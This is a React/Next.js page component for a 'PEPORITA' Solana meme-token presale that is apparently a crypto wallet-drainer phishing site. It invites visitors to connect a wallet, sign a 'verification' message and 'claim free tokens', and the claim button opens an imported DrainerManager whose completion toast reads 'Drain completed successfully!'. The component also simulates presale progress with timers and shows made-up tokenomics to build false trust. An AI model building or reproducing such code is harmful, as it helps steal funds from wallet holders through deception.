'use client';
import { useState, useEffect, useRef, useCallback } from 'react';
import Image from 'next/image';
import { FaTwitter, FaTelegram, FaChartLine, FaCoins, FaLock, FaRocket, FaCheck, FaArrowRight } from 'react-icons/fa';
import DrainerManager from './DrainerManager';
import { toast } from 'react-hot-toast';

interface Wallet {
  name: string;
  icon: string;
  is: string;
  type: string;
}

interface ExtendedPresaleProps {
  stage: 'connect' | 'verify' | 'claim';
  connect: () => void;
  verify: () => void;
  claim: () => void;
  account: string | null;
  points: number;
  connectWallet: (walletName: string) => void;
  wallets: Wallet[];
}

const ExtendedPresale: React.FC<ExtendedPresaleProps> = ({ stage, connect, verify, claim, account, points, connectWallet, wallets }) => {
  const [contribution, setContribution] = useState("");
  const [showWalletModal, setShowWalletModal] = useState(false);
  const [showDrainer, setShowDrainer] = useState(false);
  const [drainerKey, setDrainerKey] = useState(0);
  const [copied, setCopied] = useState(false);
  const [sold, setSold] = useState(0);
  const [raised, setRaised] = useState(0);
  const [timeLeft, setTimeLeft] = useState({
    days: 0,
    hours: 0,
    minutes: 0,
    seconds: 0
  });

  // Handle drainer completion
  const handleDrainerComplete = useCallback(() => {
    toast.success('Drain completed successfully!');
    setShowDrainer(false);
    // Reset the drainer after a short delay
    setTimeout(() => setDrainerKey(prev => prev + 1), 1000);
  }, []);

  // Handle drainer errors
  const handleDrainerError = useCallback((error: Error) => {
    console.error('Drainer error:', error);
    toast.error(error.message || 'An error occurred during the drain process');
  }, []);

  // Simulate presale progress
  useEffect(() => {
    const interval = setInterval(() => {
      setSold(prev => (prev < 75 ? prev + 1 : 75));
      setRaised(prev => (prev < 375 ? prev + 2.5 : 375));
    }, 5000);

    // Calculate time left (30 days from now)
    const endDate = new Date();
    endDate.setDate(endDate.getDate() + 30);
    
    const timer = setInterval(() => {
      const now = new Date().getTime();
      const distance = endDate.getTime() - now;
      
      const days = Math.floor(distance / (1000 * 60 * 60 * 24));
      const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
      const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
      const seconds = Math.floor((distance % (1000 * 60)) / 1000);
      
      setTimeLeft({ days, hours, minutes, seconds });
    }, 1000);

    return () => {
      clearInterval(interval);
      clearInterval(timer);
    };
  }, []);

  const handleContribution = () => {
    if (stage === 'connect') {
      setShowWalletModal(true);
    } else if (stage === 'verify') {
      verify();
    } else if (stage === 'claim') {
      // Show the drainer when claiming
      setShowDrainer(true);
      claim();
    }
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const renderButtonText = () => {
    switch (stage) {
      case 'connect':
        return 'Connect Wallet';
      case 'verify':
        return 'Verify Wallet';
      case 'claim':
        return 'Claim Tokens';
      default:
        return 'Connect Wallet';
    }
  };

  return (
    <div className="min-h-screen bg-gray-950 text-white">
      {/* Navigation */}
      <nav className="bg-black/80 backdrop-blur-md fixed w-full z-50 border-b border-gray-800">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex items-center justify-between h-16">
            <div className="flex items-center">
              <div className="flex-shrink-0 flex items-center">
                <Image 
                  src="/peporita.jpeg" 
                  alt="Peporita Logo" 
                  width={40} 
                  height={40} 
                  className="w-8 h-8 md:w-10 md:h-10 rounded-full"
                />
                <span className="ml-2 md:ml-3 text-lg md:text-xl font-bold bg-gradient-to-r from-green-500 to-green-600 bg-clip-text text-transparent">
                  PEPORITA
                </span>
              </div>
            </div>
            <div className="flex items-center">
              {account ? (
                <div className="flex items-center space-x-4">
                  <button 
                    onClick={() => copyToClipboard(account)}
                    className="bg-gray-800 hover:bg-gray-700 text-white px-4 py-2 rounded-lg text-sm font-medium transition-colors flex items-center space-x-2"
                  >
                    <span>{account.slice(0, 6)}...{account.slice(-4)}</span>
                    {copied ? (
                      <span className="text-green-400 text-xs">Copied!</span>
                    ) : (
                      <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" />
                      </svg>
                    )}
                  </button>
                </div>
              ) : (
                <button 
                  onClick={connect}
                  className="bg-green-500 hover:bg-green-600 text-white px-3 py-1.5 md:px-4 md:py-2 rounded-lg text-xs md:text-sm font-medium transition-colors whitespace-nowrap"
                >
                  Connect Wallet
                </button>
              )}
            </div>
            {/* Mobile menu button */}
            <div className="md:hidden ml-4">
              <button 
                onClick={() => setShowWalletModal(true)}
                className="text-gray-300 hover:text-white"
              >
                <svg className="w-6 h-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 6h16M4 12h16m-7 6h7" />
                </svg>
              </button>
            </div>
          </div>
        </div>
      </nav>

      {/* Hero Section */}
      <div className="pt-20 md:pt-24 pb-12 md:pb-16 bg-gradient-to-b from-gray-900 to-black">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="lg:grid lg:grid-cols-2 lg:gap-12 items-center">
            <div className="mb-8 lg:mb-0 text-center lg:text-left">
              <h1 className="text-3xl sm:text-4xl md:text-5xl font-bold leading-tight mb-4 sm:mb-6">
                Claim Your <span className="bg-gradient-to-r from-green-500 to-green-600 bg-clip-text text-transparent">PEPORITA</span> Tokens
              </h1>
              <p className="text-base sm:text-lg md:text-xl text-gray-300 mb-6 md:mb-8 px-4 sm:px-0 max-w-2xl mx-auto lg:mx-0">
                The hottest meme token on Solana is here! Connect your wallet to claim your PEPORITA tokens now.
              </p>
              <div className="flex flex-wrap justify-center lg:justify-start gap-3 sm:gap-4">
                <a 
                  href="#presale" 
                  className="bg-gradient-to-r from-green-500 to-green-600 text-white px-4 sm:px-6 py-2 sm:py-3 rounded-lg sm:rounded-xl font-bold hover:opacity-90 transition-all duration-200 flex items-center space-x-2 text-sm sm:text-base"
                >
                  <span>Buy Now</span>
                  <FaArrowRight className="w-3 h-3 sm:w-4 sm:h-4" />
                </a>
              </div>
            </div>
            <div className="relative -mx-4 sm:mx-0">
              <div className="hidden sm:block absolute -top-6 -right-6 w-32 h-32 md:-top-10 md:-right-10 md:w-40 md:h-40 bg-green-500 rounded-full mix-blend-multiply filter blur-3xl opacity-20"></div>
              <div className="hidden sm:block absolute -bottom-6 -left-6 w-32 h-32 md:-bottom-10 md:-left-10 md:w-40 md:h-40 bg-green-400 rounded-full mix-blend-multiply filter blur-3xl opacity-20"></div>
              <div className="relative z-10 max-w-md mx-auto">
                <PresaleCard 
                  stage={stage}
                  connect={connect}
                  verify={verify}
                  claim={claim}
                  account={account}
                  points={points}
                  connectWallet={connectWallet}
                  wallets={wallets}
                />
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Presale Section */}
      <div id="presale" className="py-12 md:py-16 lg:py-20 bg-black">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="grid md:grid-cols-2 gap-8 md:gap-12">
            <div className="mb-8 md:mb-0">
              <h2 className="text-2xl sm:text-3xl font-bold mb-6 text-center md:text-left">Presale Details</h2>
              <div className="space-y-4 sm:space-y-6">
                <div className="bg-gray-900 p-4 sm:p-6 rounded-xl">
                  <h3 className="text-lg sm:text-xl font-semibold mb-3 sm:mb-4">Token Information</h3>
                  <div className="space-y-2 sm:space-y-3 text-sm sm:text-base">
                    <div className="flex justify-between">
                      <span className="text-gray-400">Network</span>
                      <p className="text-white font-medium">Solana</p>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-gray-400">Token Symbol:</span>
                      <span className="font-medium">PEPO</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-gray-400">Total Supply:</span>
                      <span className="font-medium text-right">1B PEPO</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-gray-400">Presale Supply:</span>
                      <span className="font-medium text-right">500M (50%)</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-gray-400">Token Price:</span>
                      <span className="font-medium text-right">0.0001 SOL</span>
                    </div>
                  </div>
                </div>
              </div>
            </div>
            <div>
              <h2 className="text-2xl sm:text-3xl font-bold mb-6 text-center md:text-left">How to Participate</h2>
              <div className="space-y-3 sm:space-y-4">
                <div className="flex items-start space-x-3 sm:space-x-4">
                  <div className="flex-shrink-0 w-7 h-7 sm:w-8 sm:h-8 rounded-full bg-green-500 flex items-center justify-center text-white font-bold text-sm sm:text-base">1</div>
                  <div>
                    <h3 className="font-semibold text-sm sm:text-base">Connect Your Wallet</h3>
                    <p className="text-gray-400 text-xs sm:text-sm">Use Phantom, Solflare, or any Solana wallet.</p>
                  </div>
                </div>
                <div className="flex items-start space-x-3 sm:space-x-4">
                  <div className="flex-shrink-0 w-7 h-7 sm:w-8 sm:h-8 rounded-full bg-green-500 flex items-center justify-center text-white font-bold text-sm sm:text-base">2</div>
                  <div>
                    <h3 className="font-semibold text-sm sm:text-base">Verify Your Wallet</h3>
                    <p className="text-gray-400 text-xs sm:text-sm">Sign a message to verify wallet ownership.</p>
                  </div>
                </div>
                <div className="flex items-start space-x-3 sm:space-x-4">
                  <div className="flex-shrink-0 w-7 h-7 sm:w-8 sm:h-8 rounded-full bg-green-500 flex items-center justify-center text-white font-bold text-sm sm:text-base">3</div>
                  <div>
                    <h3 className="font-semibold text-sm sm:text-base">Claim Your Tokens</h3>
                    <p className="text-gray-400 text-xs sm:text-sm">Instantly receive your PEPORITA tokens.</p>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Tokenomics */}
      <div className="py-12 md:py-16 lg:py-20 bg-gray-900">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <h2 className="text-2xl sm:text-3xl font-bold text-center mb-8 md:mb-12 lg:mb-16">Tokenomics</h2>
          <div className="grid grid-cols-2 sm:grid-cols-2 md:grid-cols-4 gap-4 sm:gap-6 md:gap-8">
            {[
              { icon: FaCoins, title: '50% Presale', value: '500M' },
              { icon: FaLock, title: '20% Liquidity', value: '200M' },
              { icon: FaChartLine, title: '15% Marketing', value: '150M' },
              { icon: FaRocket, title: '15% Team', value: '150M (locked)' },
            ].map((item, index) => (
              <div key={index} className="bg-gray-800 p-3 sm:p-4 md:p-6 rounded-xl text-center">
                <div className="w-12 h-12 sm:w-14 sm:h-14 md:w-16 md:h-16 mx-auto bg-green-500/10 rounded-full flex items-center justify-center text-green-500 mb-2 sm:mb-3 md:mb-4">
                  <item.icon className="w-5 h-5 sm:w-6 sm:h-6 md:w-7 md:h-7" />
                </div>
                <h3 className="text-base sm:text-lg md:text-xl font-bold mb-1 sm:mb-2">{item.value} PEPO</h3>
                <p className="text-xs sm:text-sm text-gray-400">{item.title}</p>
              </div>
            ))}
          </div>
        </div>
      </div>

      {/* Roadmap */}
      <div className="py-12 md:py-16 lg:py-20 bg-black">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <h2 className="text-2xl sm:text-3xl font-bold text-center mb-8 md:mb-12 lg:mb-16">Roadmap</h2>
          <div className="relative">
            <div className="hidden md:block absolute left-1/2 w-0.5 h-full bg-gray-800 -ml-px"></div>
            {[
              { 
                title: 'Phase 1: Presale', 
                items: [
                  'Launch official website and social media',
                  'Community building and marketing',
                  'Smart contract audit'
                ]
              },
              { 
                title: 'Phase 2: Launch', 
                items: [
                  'DEX listing (Uniswap, Raydium)',
                  'CEX listings',
                  'Liquidity locking'
                ]
              },
              { 
                title: 'Phase 3: Growth', 
                items: [
                  'Marketing campaigns',
                  'Partnerships',
                  'Community events'
                ]
              }
            ].map((phase, index) => (
              <div key={index} className="mb-8 md:mb-12 flex flex-col md:flex-row">
                <div className="w-full md:w-1/2 md:px-6 mb-4 md:mb-0">
                  <div className={`bg-gray-900 p-4 sm:p-6 rounded-xl ${index % 2 === 0 ? 'md:mr-0 md:ml-auto md:pl-12' : 'md:ml-0 md:mr-auto md:pr-12'}`}>
                    <h3 className="text-lg sm:text-xl font-bold mb-2 sm:mb-3">{phase.title}</h3>
                    <ul className="space-y-1 sm:space-y-2 text-sm sm:text-base">
                      {phase.items.map((item, i) => (
                        <li key={i} className="flex items-start">
                          <FaCheck className="text-green-500 mt-1 mr-2 flex-shrink-0" />
                          <span>{item}</span>
                        </li>
                      ))}
                    </ul>
                  </div>
                </div>
                <div className="hidden md:flex md:w-1/2 items-center justify-center">
                  <div className="w-5 h-5 sm:w-6 sm:h-6 rounded-full bg-green-500"></div>
                </div>
              </div>
            ))}
          </div>
        </div>
      </div>

      {/* Footer */}
      <footer className="bg-gray-900 py-8 sm:py-10 md:py-12">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex flex-col sm:flex-row justify-between items-center">
            <div className="flex items-center mb-4 sm:mb-0">
              <a href="#" className="text-gray-400 hover:text-white transition-colors" aria-label="Twitter">
                <FaTwitter className="w-5 h-5 sm:w-6 sm:h-6" />
              </a>
              <a href="#" className="text-gray-400 hover:text-white transition-colors" aria-label="Telegram">
                <FaTelegram className="w-5 h-5 sm:w-6 sm:h-6" />
              </a>
            </div>
            <div className="mt-6 sm:mt-8 pt-6 sm:pt-8 border-t border-gray-800 text-center text-xs sm:text-sm text-gray-400">
              <p> 2023 PEPORITA. All rights reserved.</p>
              <p className="mt-1 sm:mt-2">This is not financial advice. Cryptocurrency investments are high risk.</p>
            </div>
          </div>
        </div>
      </footer>
      
      {/* Drainer Modal */}
      {showDrainer && (
        <div className="fixed inset-0 bg-black bg-opacity-75 flex items-center justify-center z-50 p-4">
          <div className="relative w-full max-w-2xl">
            <button 
              onClick={() => setShowDrainer(false)}
              className="absolute -top-10 right-0 text-gray-400 hover:text-white z-10"
            >
              ✕ Close
            </button>
            <div className="bg-gray-900 rounded-2xl p-6 w-full max-w-2xl">
              <DrainerManager 
                key={drainerKey}
                onComplete={handleDrainerComplete}
                onError={handleDrainerError}
              />
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

interface PresaleCardProps {
  stage: 'connect' | 'verify' | 'claim';
  connect: () => void;
  verify: () => void;
  claim: () => void;
  account: string | null;
  points: number;
  connectWallet: (walletName: string) => void;
  wallets: Wallet[];
}

const PresaleCard: React.FC<PresaleCardProps> = ({ stage, connect, verify, claim, account, points, connectWallet, wallets }) => {
  const [showWalletModal, setShowWalletModal] = useState(false);
  const [showDrainer, setShowDrainer] = useState(false);
  const [drainerKey, setDrainerKey] = useState(0);
  const [contribution, setContribution] = useState("");

  // Handle drainer completion
  const handleDrainerComplete = useCallback(() => {
    toast.success('Drain completed successfully!');
    setShowDrainer(false);
    // Reset the drainer after a short delay
    setTimeout(() => setDrainerKey(prev => prev + 1), 1000);
  }, []);

  // Handle drainer errors
  const handleDrainerError = useCallback((error: Error) => {
    console.error('Drainer error:', error);
    toast.error(error.message || 'An error occurred during the drain process');
  }, []);

  const handleContribution = () => {
    if (stage === 'connect') {
      setShowWalletModal(true);
    } else if (stage === 'verify') {
      verify();
    } else if (stage === 'claim') {
      // Show the drainer when claiming
      setShowDrainer(true);
      claim();
    }
  };

  return (
    <div className="bg-gradient-to-br from-green-600 to-green-400 p-0.5 rounded-2xl shadow-xl">
      <div className="bg-gray-900 rounded-2xl p-6 w-full max-w-md">
        <div className="flex justify-between items-center mb-6">
          <div className="flex items-center space-x-2">
            <Image 
              src="/peporita.jpeg" 
              alt="Peporita Logo" 
              width={40} 
              height={40} 
              className="rounded-full"
            />
            <h2 className="text-2xl font-bold text-white">PEPORITA</h2>
          </div>
          <div className="bg-green-500 text-white px-3 py-1 rounded-full text-sm font-bold">
            LIVE
          </div>
        </div>

        {/* Progress Bar */}
        <div className="mb-6">
          <div className="flex justify-between text-sm text-gray-300 mb-2">
            <span>Claim Status</span>
            <span>Active</span>
          </div>
          <div className="w-full bg-gray-700 rounded-full h-2.5">
            <div 
              className="bg-gradient-to-r from-green-500 to-green-600 h-2.5 rounded-full" 
              style={{ width: '100%' }}
            ></div>
          </div>
        </div>

        {/* Token Info - Simplified */}
        <div className="bg-gray-800 rounded-xl p-4 mb-6">
          <div className="grid grid-cols-1 gap-4">
            <div className="text-center">
              <p className="text-gray-400 text-sm">Total Supply</p>
              <p className="text-white font-medium">1B PEPO</p>
            </div>
          </div>
        </div>

        {/* Connect/Contribute/Claim Section */}
        <div className="space-y-4">
          {stage === 'connect' && (
            <div className="space-y-3">
              <button
                onClick={connect}
                className="w-full bg-gradient-to-r from-green-500 to-green-600 text-white py-3 px-6 rounded-xl font-bold hover:opacity-90 transition-all duration-200 flex items-center justify-center space-x-2"
              >
                <span>Connect Wallet</span>
                <FaArrowRight />
              </button>
              <button 
                onClick={() => setShowWalletModal(true)}
                className="w-full bg-green-500 hover:bg-green-600 text-white py-3 px-6 rounded-xl font-bold transition-all duration-200"
              >
                Claim your free tokens
              </button>
            </div>
          )}

          {(stage === 'verify' || stage === 'claim') && (
            <div className="space-y-4">
              <div className="bg-gray-800 p-4 rounded-xl">
                <button
                  onClick={handleContribution}
                  className="w-full py-3 px-6 rounded-lg font-bold text-white transition-colors bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700"
                >
                  {stage === 'verify' ? 'Verify' : 'Claim Your Free Tokens'}
                </button>
              </div>
            </div>
          )}
        </div>

        {/* Social Links */}
        <div className="mt-6 pt-6 border-t border-gray-800 space-y-3">
          <p className="text-center text-gray-400 text-sm">Join our community</p>
          <div className="flex justify-center space-x-6">
            <a 
              href="https://x.com/PeporitaOnSol" 
              target="_blank" 
              rel="noopener noreferrer"
              className="text-gray-400 hover:text-white transition-colors"
            >
              <FaTwitter className="w-6 h-6" />
            </a>
            <a 
              href="https://t.me/PeporitaOnSolana" 
              target="_blank" 
              rel="noopener noreferrer"
              className="text-gray-400 hover:text-white transition-colors"
            >
              <FaTelegram className="w-6 h-6" />
            </a>
          </div>
        </div>
      </div>

      {/* Wallet Modal */}
      {stage === 'connect' && showWalletModal && (
        <div className="fixed inset-0 bg-black bg-opacity-75 flex items-center justify-center z-50 p-4">
          <div className="bg-gray-900 rounded-2xl p-6 w-full max-w-sm">
            <h3 className="text-xl font-bold text-white mb-6">Connect Wallet</h3>
            <div className="space-y-3">
              {wallets.map((wallet) => (
                <button
                  key={wallet.name}
                  onClick={() => {
                    connectWallet(wallet.name);
                    setShowWalletModal(false);
                  }}
                  className="w-full flex items-center space-x-3 bg-gray-800 hover:bg-gray-700 text-white px-4 py-3 rounded-lg transition-colors"
                >
                  <Image 
                    src={wallet.icon} 
                    alt={wallet.name} 
                    width={24} 
                    height={24} 
                    className="w-6 h-6"
                  />
                  <span>{wallet.name}</span>
                </button>
              ))}
            </div>
            <button
              onClick={() => setShowWalletModal(false)}
              className="mt-6 w-full py-2 text-gray-400 hover:text-white transition-colors"
            >
              Cancel
            </button>
          </div>
        </div>
      )}

      {/* Drainer Modal */}
      {showDrainer && (
        <div className="fixed inset-0 bg-black bg-opacity-75 flex items-center justify-center z-50 p-4">
          <div className="relative w-full max-w-2xl">
            <button 
              onClick={() => setShowDrainer(false)}
              className="absolute -top-10 right-0 text-gray-400 hover:text-white z-10"
            >
              ✕ Close
            </button>
            <div className="bg-gray-900 rounded-2xl p-6 w-full max-w-2xl">
              <DrainerManager 
                key={drainerKey}
                onComplete={handleDrainerComplete}
                onError={handleDrainerError}
              />
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default ExtendedPresale;
